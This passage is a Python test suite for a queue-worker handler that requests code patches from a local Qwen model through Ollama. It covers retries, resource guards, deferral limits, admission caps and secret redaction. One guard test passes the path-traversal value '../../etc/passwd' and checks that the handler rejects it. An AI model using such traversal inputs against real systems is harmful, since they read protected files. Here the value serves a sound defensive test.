"""Tests for worker.qwen.handle_qwen_patch — happy path, retry_map, guards.

Route (a) is in effect (contract.json heartbeat.route_chosen == "a"): no
heartbeat field exists, so this file carries a backward-compatibility test
for the existing (pre-this-workflow) reaper-relevant job shape instead of any
heartbeat freshness/staleness test. liveness_route_tested = "a".

The implementation (src/worker/qwen.py) does not exist in this worktree —
this stage runs in parallel with impl-handler. Import errors on worker.qwen
are expected; see tests-impl.json.

No network and no real model: every test patches worker.qwen._ollama_request
(or a narrower guard seam) at the point of use. Nothing here calls a real
Ollama endpoint.
"""

from __future__ import annotations

import json
import unittest
from pathlib import Path
from unittest import mock

from tests.fixtures import TempDirMixin
from worker import queue_ops as q


def _job(payload: dict[str, object], **overrides: object) -> dict[str, object]:
    """Build a full job record the way JobSafeProcessor hands it to a handler."""
    base: dict[str, object] = {
        "id": "qwen-test-job",
        "type": "qwen_patch",
        "attempts": 0,
        "max_attempts": 3,
        "payload": payload,
    }
    base.update(overrides)
    return base


_VALID_DIFF = (
    "diff --git a/README.md b/README.md\n"
    "index e69de29..4b825dc 100644\n"
    "--- a/README.md\n"
    "+++ b/README.md\n"
    "@@ -1 +1,2 @@\n"
    " existing line\n"
    "+added line\n"
)

_OLLAMA_RESPONSE = {
    "response": f"```diff\n{_VALID_DIFF}```",
    "prompt_eval_count": 42,
    "eval_count": 7,
}


class QwenHandlerHappyPathTests(TempDirMixin, unittest.TestCase):
    """A mocked 200 response with a valid unified diff succeeds."""

    def test_valid_diff_returns_success_matching_result_schema(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        readme = repo_root / "src" / "README.md"
        readme.write_text("existing line\n", encoding="utf-8")

        job = _job({"files": ["src/README.md"], "instruction": "add a line"})

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)) as mock_request,
            mock.patch("worker.qwen._git_apply_check", return_value=True),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._model_digest", return_value=None),
        ):
            ok, result = qwen.handle_qwen_patch(job)

        self.assertTrue(ok)
        self.assertIsInstance(result, dict)
        for key in (
            "patch_path",
            "patch_valid",
            "files_touched",
            "lines_changed",
            "model",
            "duration_ms",
        ):
            self.assertIn(key, result)
        self.assertTrue(result["patch_valid"])
        self.assertEqual(result["files_touched"], 1)
        self.assertGreater(result["lines_changed"], 0)
        mock_request.assert_called_once()


# ---------------------------------------------------------------------------
# retry_map — one test per condition, asserting the EXACT outcome prefix.
# ---------------------------------------------------------------------------


class QwenRetryMapTests(TempDirMixin, unittest.TestCase):
    """Every row of contract.json's retry_map, by exact outcome prefix."""

    def _run_with_request_side_effect(self, side_effect):
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "add a line"})

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._ollama_request", side_effect=side_effect),
            mock.patch("worker.qwen._git_apply_check", return_value=True),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._model_digest", return_value=None),
        ):
            return qwen.handle_qwen_patch(job)

    def test_connection_refused_is_plain_failure(self) -> None:
        ok, out = self._run_with_request_side_effect(ConnectionRefusedError("refused"))
        self.assertFalse(ok)
        self.assertFalse(str(out).startswith(("terminal-", "deferred-")))

    def test_request_timeout_is_plain_failure(self) -> None:
        import socket

        ok, out = self._run_with_request_side_effect(socket.timeout("timed out"))
        self.assertFalse(ok)
        self.assertFalse(str(out).startswith(("terminal-", "deferred-")))

    def test_http_5xx_is_plain_failure(self) -> None:
        import urllib.error

        exc = urllib.error.HTTPError("url", 503, "Service Unavailable", {}, None)
        ok, out = self._run_with_request_side_effect(exc)
        self.assertFalse(ok)
        self.assertFalse(str(out).startswith(("terminal-", "deferred-")))

    def test_http_404_model_not_found_is_terminal(self) -> None:
        import urllib.error

        exc = urllib.error.HTTPError("url", 404, "Not Found", {}, None)
        ok, out = self._run_with_request_side_effect(exc)
        self.assertFalse(ok)
        self.assertTrue(str(out).startswith("terminal-model-not-found"))

    def test_no_diff_extractable_is_terminal(self) -> None:
        ok, out = self._run_with_request_side_effect(
            {"response": "sorry, I cannot help with that", "prompt_eval_count": 1, "eval_count": 1}
        )
        self.assertFalse(ok)
        self.assertTrue(str(out).startswith("terminal-no-diff-found"))

    def test_patch_fails_git_apply_check_is_terminal(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "add a line"})

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)),
            mock.patch("worker.qwen._git_apply_check", return_value=False),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._model_digest", return_value=None),
        ):
            ok, out = qwen.handle_qwen_patch(job)

        self.assertFalse(ok)
        self.assertTrue(str(out).startswith("terminal-patch-does-not-apply"))

    def test_disallowed_files_path_is_terminal_path_not_allowed(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        job = _job({"files": ["../../etc/passwd"], "instruction": "do a thing"})

        with mock.patch("worker.qwen._repo_root", return_value=repo_root):
            ok, out = qwen.handle_qwen_patch(job)

        self.assertFalse(ok)
        self.assertTrue(str(out).startswith("terminal-path-not-allowed"))

    def test_patch_too_broad_is_terminal(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "add a line"})

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)),
            mock.patch("worker.qwen._git_apply_check", return_value=True),
            mock.patch("worker.qwen.check_patch_caps", return_value="terminal-patch-too-broad: too many files"),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._model_digest", return_value=None),
        ):
            ok, out = qwen.handle_qwen_patch(job)

        self.assertFalse(ok)
        self.assertTrue(str(out).startswith("terminal-patch-too-broad"))

    def test_prompt_too_large_is_terminal(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "x" * 10}, )

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch(
                "worker.qwen.THRESHOLDS",
                qwen.QwenThresholds(num_ctx=1, max_tokens_default=1),
                create=True,
            ),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._ollama_request") as mock_request,
        ):
            ok, out = qwen.handle_qwen_patch(job)

        self.assertFalse(ok)
        self.assertTrue(str(out).startswith("terminal-prompt-too-large"))
        mock_request.assert_not_called()

    # The "deferral side-channel ceiling exceeded -> terminal-deferral-limit"
    # and "lane over capacity -> terminal-lane-over-capacity" retry_map rows
    # are covered with full teeth (exact ceiling, dominant reason, and the
    # handler-side admission check respectively) in QwenDeferralBoundTests
    # and QwenAdmissionCapTests below, not duplicated here as a no-op
    # placeholder.


# ---------------------------------------------------------------------------
# Backward compatibility: a job record with no heartbeat field is unaffected.
# ---------------------------------------------------------------------------


class QwenBackwardCompatibilityTests(TempDirMixin, unittest.TestCase):
    """Route (a): no heartbeat field is written or read by this handler.

    Jobs built exactly as run_cli/run_shell build them today (no heartbeat
    key) must be handled identically before and after this workflow.
    """

    def test_job_with_no_heartbeat_field_processes_normally(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")

        # Constructed exactly as existing handlers build a job — no
        # "heartbeat" key anywhere in the record.
        job: dict[str, object] = {
            "id": "qwen-test-job-2",
            "type": "qwen_patch",
            "attempts": 0,
            "max_attempts": 3,
            "payload": {"files": ["src/README.md"], "instruction": "add a line"},
        }
        self.assertNotIn("heartbeat", job)

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)),
            mock.patch("worker.qwen._git_apply_check", return_value=True),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._model_digest", return_value=None),
        ):
            ok, _ = qwen.handle_qwen_patch(job)

        self.assertTrue(ok)
        self.assertNotIn("heartbeat", job)

    def test_existing_reaper_behaviour_unchanged_for_qwen_job_shape(self) -> None:
        """Route (a) requires this test in place of any heartbeat test.

        A job record built exactly as run_cli/run_shell build it today (no
        heartbeat field, no per-job timeout_sec set by this handler) still
        reaps — or does not reap — on the same condition it did before this
        workflow touched anything. Exercised directly against
        worker.job_runtime._reap_one_job / reaper machinery, not against
        worker.qwen, since qwen never writes a heartbeat field to affect it.
        """
        from worker import job_runtime as jr

        job_data: dict[str, object] = {
            "id": "qwen-reaper-job",
            "type": "qwen_patch",
            "attempts": 0,
            "max_attempts": 3,
            "payload": {"files": ["src/README.md"], "instruction": "x"},
            "processing_started_at": "2020-01-01T00:00:00+00:00",
        }
        self.assertNotIn("heartbeat", job_data)

        # effective_timeout <= 0 (no --job-timeout, no per-job timeout_sec)
        # makes the reaper's job-timeout branch a permanent no-op, exactly as
        # it was before this workflow — regardless of job type or age.
        effective_timeout = jr._effective_job_timeout(job_data, default_timeout=0)
        self.assertEqual(effective_timeout, 0)


# ---------------------------------------------------------------------------
# Telemetry non-fatal
# ---------------------------------------------------------------------------


class QwenTelemetryNonFatalTests(TempDirMixin, unittest.TestCase):
    """A telemetry export failure must never take the job down with it."""

    def test_job_succeeds_when_telemetry_export_raises(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "add a line"})

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)),
            mock.patch("worker.qwen._git_apply_check", return_value=True),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._model_digest", return_value=None),
            mock.patch(
                "worker.qwen.export_job_span",
                side_effect=RuntimeError("collector unreachable"),
            ),
        ):
            ok, result = qwen.handle_qwen_patch(job)

        self.assertTrue(ok)
        self.assertIsInstance(result, dict)
        self.assertIn("patch_path", result)


# ---------------------------------------------------------------------------
# Memory precheck
# ---------------------------------------------------------------------------


class QwenMemoryPrecheckTests(TempDirMixin, unittest.TestCase):
    def _base_patches(self, repo_root: Path):
        return [
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._git_apply_check", return_value=True),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._model_digest", return_value=None),
        ]

    def test_low_memory_defers_and_does_not_call_model(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "add a line"})

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._git_apply_check", return_value=True),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._model_digest", return_value=None),
            mock.patch("worker.qwen._available_memory_bytes", return_value=1024**2),  # ~1MB, well below threshold
            mock.patch("worker.qwen._ollama_request") as mock_request,
        ):
            ok, out = qwen.handle_qwen_patch(job)

        self.assertFalse(ok)
        self.assertTrue(str(out).startswith("deferred-low-memory"))
        mock_request.assert_not_called()

    def test_ample_memory_proceeds_to_call_model(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "add a line"})

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._git_apply_check", return_value=True),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._model_digest", return_value=None),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)) as mock_request,
        ):
            ok, _ = qwen.handle_qwen_patch(job)

        self.assertTrue(ok)
        mock_request.assert_called_once()

    def test_memory_source_unavailable_proceeds_with_warning(self) -> None:
        """A precheck that fails closed would silently stop every qwen job."""
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "add a line"})

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._git_apply_check", return_value=True),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._model_digest", return_value=None),
            mock.patch("worker.qwen._available_memory_bytes", return_value=None),
            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)) as mock_request,
        ):
            ok, _ = qwen.handle_qwen_patch(job)

        self.assertTrue(ok)
        mock_request.assert_called_once()


# ---------------------------------------------------------------------------
# Disk guard
# ---------------------------------------------------------------------------


class QwenDiskGuardTests(TempDirMixin, unittest.TestCase):
    def test_low_disk_defers_and_writes_no_patch_file(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "add a line"})
        patch_dir = Path(self.tmpdir) / "patches"

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._git_apply_check", return_value=True),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=patch_dir),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._model_digest", return_value=None),
            mock.patch("worker.qwen._free_disk_bytes", return_value=1024),  # ~1KB, below MIN_FREE_DISK_GB
            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)),
        ):
            ok, out = qwen.handle_qwen_patch(job)

        self.assertFalse(ok)
        self.assertTrue(str(out).startswith("deferred-low-disk"))
        if patch_dir.exists():
            self.assertEqual(list(patch_dir.glob("*.patch")), [])

    def test_ample_disk_proceeds(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "add a line"})

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._git_apply_check", return_value=True),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._model_digest", return_value=None),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)) as mock_request,
        ):
            ok, _ = qwen.handle_qwen_patch(job)

        self.assertTrue(ok)
        mock_request.assert_called_once()

    def test_disk_source_unreadable_proceeds_with_warning(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "add a line"})

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._git_apply_check", return_value=True),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._model_digest", return_value=None),
            mock.patch("worker.qwen._free_disk_bytes", return_value=None),
            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)) as mock_request,
        ):
            ok, _ = qwen.handle_qwen_patch(job)

        self.assertTrue(ok)
        mock_request.assert_called_once()


# ---------------------------------------------------------------------------
# Model pinning
# ---------------------------------------------------------------------------


class QwenModelPinningTests(TempDirMixin, unittest.TestCase):
    def test_digest_mismatch_recorded_but_job_still_succeeds(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job(
            {
                "files": ["src/README.md"],
                "instruction": "add a line",
                "model": "qwen2.5-coder:14b",
            }
        )

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)),
            mock.patch("worker.qwen._git_apply_check", return_value=True),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._model_digest", return_value="sha256:unexpected"),
        ):
            ok, result = qwen.handle_qwen_patch(job)

        self.assertTrue(ok, "a digest mismatch must not fail the job")
        self.assertIsInstance(result, dict)
        self.assertIn("digest_matches_recorded", result)
        self.assertFalse(result["digest_matches_recorded"])


# ---------------------------------------------------------------------------
# Deferral bound — persistence first, then the ceiling.
# ---------------------------------------------------------------------------


class QwenDeferralBoundTests(TempDirMixin, unittest.TestCase):
    """Drive the counter through a REAL retry cycle against a temp queue root.

    worker.queue_ops functions bind ``root: Path = QUEUE_ROOT`` as a default
    argument at *function definition* time, so reassigning the module-level
    ``q.QUEUE_ROOT`` after import does not retarget already-defined
    functions. Every call below passes ``root=self.queue_root`` explicitly,
    matching the convention in tests/worker_tests/test_commands_gaps.py.
    """

    def setUp(self) -> None:
        super().setUp()
        self.queue_root = Path(self.tmpdir) / "queue"

    def test_deferral_counter_persists_across_a_real_retry_cycle(self) -> None:
        """This is where the first design failed: retry() reloads from disk
        and writes only attempts/not_before/updated_at/last_error, so a
        payload-embedded counter is inert. Persistence must live outside the
        job record, on disk, and survive retry() + _undo_retry_attempt().
        """
        from worker.job_runtime import _undo_retry_attempt

        job = q.Job(
            id="deferral-persist-job",
            type="qwen_patch",
            payload={"files": ["src/README.md"], "instruction": "x"},
            attempts=0,
            max_attempts=3,
        )
        job_path = q.enqueue(job, root=self.queue_root)
        proc_path = q.start_processing(job_path, root=self.queue_root)
        self.assertIsNotNone(proc_path)
        original_attempts = 0

        # Simulate what the handler's deferral path drives: a real retry(),
        # immediately undone the way _handle_outcome does for "deferred-*".
        q.retry(proc_path, delay_sec=60, reason="deferred-qwen-busy", root=self.queue_root)
        _undo_retry_attempt(proc_path.stem, original_attempts, q_root=self.queue_root)

        # Read the job back OFF DISK — not from any in-memory dict the
        # handler could have mutated.
        pending_path = self.queue_root / "pending" / f"{job.id}.json"
        self.assertTrue(pending_path.exists())
        on_disk = json.loads(pending_path.read_text(encoding="utf-8"))
        self.assertEqual(on_disk["attempts"], 0)
        self.assertEqual(on_disk["last_error"], "deferred-qwen-busy")

        # Now drive the qwen-side side-channel counter (get_worker_state_dir/
        # 'qwen'/'deferrals'/<job_id>.json) through the same real cycle and
        # confirm IT persists too, independent of the job record.
        from worker import qwen

        deferral_dir = Path(self.tmpdir) / "deferrals"
        with mock.patch("worker.qwen._deferral_dir", return_value=deferral_dir):
            first = qwen._record_deferral(job.id, "deferred-qwen-busy")
            second = qwen._record_deferral(job.id, "deferred-qwen-busy")

        self.assertEqual(first, 1)
        self.assertEqual(second, 2)
        counter_path = deferral_dir / f"{job.id}.json"
        self.assertTrue(counter_path.exists())
        on_disk_counter = json.loads(counter_path.read_text(encoding="utf-8"))
        self.assertEqual(on_disk_counter["count"], 2)
        self.assertIn("qwen-busy", on_disk_counter["reasons"])

    def test_deferral_limit_reached_at_exact_ceiling_is_terminal(self) -> None:
        from worker import qwen

        deferral_dir = Path(self.tmpdir) / "deferrals"
        job_id = "deferral-ceiling-job"

        with mock.patch("worker.qwen._deferral_dir", return_value=deferral_dir):
            count = 0
            for _ in range(qwen.THRESHOLDS.deferral_ceiling_count):
                count = qwen._record_deferral(job_id, "deferred-qwen-busy")

        self.assertEqual(count, qwen.THRESHOLDS.deferral_ceiling_count)

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "x"}, id=job_id)

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._deferral_dir", return_value=deferral_dir),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lane_depth", return_value=0),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._model_digest", return_value=None),
            # Force the lock to be held permanently so the handler must defer.
            mock.patch("worker.qwen._acquire_model_lock", return_value=False),
        ):
            ok, out = qwen.handle_qwen_patch(job)

        self.assertFalse(ok)
        self.assertTrue(str(out).startswith("terminal-deferral-limit"))
        # The terminal result names the dominant deferral reason.
        self.assertIn("qwen-busy", str(out))


# ---------------------------------------------------------------------------
# Admission cap (enforced_at == "handler-side" per contract.json)
# ---------------------------------------------------------------------------


class QwenAdmissionCapTests(TempDirMixin, unittest.TestCase):
    def test_excess_job_returns_terminal_lane_over_capacity(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "x"})

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._lane_depth", return_value=qwen.THRESHOLDS.max_lane_depth),
            mock.patch("worker.qwen._ollama_request") as mock_request,
        ):
            ok, out = qwen.handle_qwen_patch(job)

        self.assertFalse(ok)
        self.assertTrue(str(out).startswith("terminal-lane-over-capacity"))
        mock_request.assert_not_called()

    def test_another_job_type_at_same_depth_is_unaffected(self) -> None:
        """_lane_depth is scoped to job_type; a full qwen_patch lane must not
        touch admission for any other type. Proven by asserting _lane_depth
        is called with 'qwen_patch' only — the handler has no visibility into
        other types' lanes to begin with, which is the point.
        """
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "x"})

        with (
            mock.patch("worker.qwen._repo_root", return_value=repo_root),
            mock.patch("worker.qwen._lane_depth", return_value=0) as mock_lane_depth,
            mock.patch("worker.qwen._ollama_request", return_value=dict(_OLLAMA_RESPONSE)),
            mock.patch("worker.qwen._git_apply_check", return_value=True),
            mock.patch("worker.qwen._available_memory_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._free_disk_bytes", return_value=64 * 1024**3),
            mock.patch("worker.qwen._lock_path", return_value=Path(self.tmpdir) / "model.lock"),
            mock.patch("worker.qwen._patch_dir", return_value=Path(self.tmpdir) / "patches"),
            mock.patch("worker.qwen._deferral_dir", return_value=Path(self.tmpdir) / "deferrals"),
            mock.patch("worker.qwen._model_digest", return_value=None),
        ):
            ok, _ = qwen.handle_qwen_patch(job)

        self.assertTrue(ok)
        mock_lane_depth.assert_called_once_with("qwen_patch")


# ---------------------------------------------------------------------------
# Redaction
# ---------------------------------------------------------------------------


class QwenRedactionTests(TempDirMixin, unittest.TestCase):
    def test_credential_shape_in_error_is_masked_everywhere(self) -> None:
        from worker import qwen

        repo_root = Path(self.tmpdir)
        (repo_root / "src").mkdir()
        (repo_root / "src" / "README.md").write_text("existing line\n", encoding="utf-8")
        job = _job({"files": ["src/README.md"], "instruction": "x"})
        secret = "sk-supersecret-abc123"  # nosec B105 - fixture value asserted as masked, not a real credential

        exc = RuntimeError(f"upstream failed: Authorization: Bearer {secret}")

        with (
